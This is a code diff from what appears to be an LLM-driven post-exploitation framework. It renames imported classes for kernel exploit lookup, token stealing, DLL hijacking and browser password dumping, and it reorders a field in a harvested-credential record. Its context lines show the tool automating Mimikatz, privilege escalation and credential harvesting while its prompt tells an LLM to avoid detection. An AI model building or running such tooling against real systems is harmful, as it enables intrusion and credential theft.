@@ -20,11 +20,11 @@ from .llm_orchestrator import LLMOrchestrator
 # Import post-exploitation tools
 sys.path.insert(0, str(Path(__file__).parent.parent))
 from privilege_escalation.misconfiguration_enum import MisconfigurationEnumerator
-from privilege_escalation.kernel_exploit_db import KernelExploitDB
-from privilege_escalation.token_manipulation import TokenManipulation
-from privilege_escalation.dll_hijacking import DLLHijacking
+from privilege_escalation.kernel_exploit_db import KernelExploitDatabase
+from privilege_escalation.token_manipulation import TokenManipulator
+from privilege_escalation.dll_hijacking import DLLHijacker
 from credential_harvesting.mimikatz_automation import MimikatzAutomation
-from credential_harvesting.browser_dumper import BrowserDumper
+from credential_harvesting.browser_dumper import BrowserPasswordDumper
 from credential_harvesting.memory_scraper import MemoryScraper
 from credential_harvesting.credential_manager import CredentialManager
 from persistence.persistence_manager import PersistenceManager
@@ -73,8 +73,8 @@ class HarvestedCredential:
     username: str
     credential_type: str  # password, hash, key, token, ticket
     credential_value: str
-    domain: Optional[str] = None
     source: str  # mimikatz, browser, memory, lsass, sam, etc.
+    domain: Optional[str] = None
     privilege_level: str = "user"  # user, admin, domain_admin
     valid: bool = True
     timestamp: datetime = field(default_factory=datetime.now)
@@ -468,7 +468,7 @@ Prioritize effectiveness while being mindful of detection risks."""
         try:
             if 'kernel_exploit' in tech_type:
                 # Use kernel exploit database
-                kernel_db = KernelExploitDB()
+                kernel_db = KernelExploitDatabase()
                 exploit = await kernel_db.find_exploit(host.os_version)
                 if exploit:
                     logger.info(f"    Using kernel exploit: {exploit.get('cve')}")
@@ -508,13 +508,13 @@ Prioritize effectiveness while being mindful of detection risks."""
         try:
             if 'token' in tech_type:
                 # Token manipulation
-                token_manip = TokenManipulation()
+                token_manip = TokenManipulator()
                 success = await token_manip.steal_system_token()
                 return success
             
             elif 'dll_hijack' in tech_type:
                 # DLL hijacking
-                dll_hijack = DLLHijacking()
+                dll_hijack = DLLHijacker()
                 vulns = await dll_hijack.find_hijackable_services()
                 if vulns:
                     return True
@@ -582,7 +582,7 @@ Prioritize effectiveness while being mindful of detection risks."""
                 
                 elif 'browser' in method_name:
                     # Browser password dumping
-                    browser_dumper = BrowserDumper()
+                    browser_dumper = BrowserPasswordDumper()
                     browser_creds = await browser_dumper.dump_all_browsers()
                     
                     for cred in browser_creds:
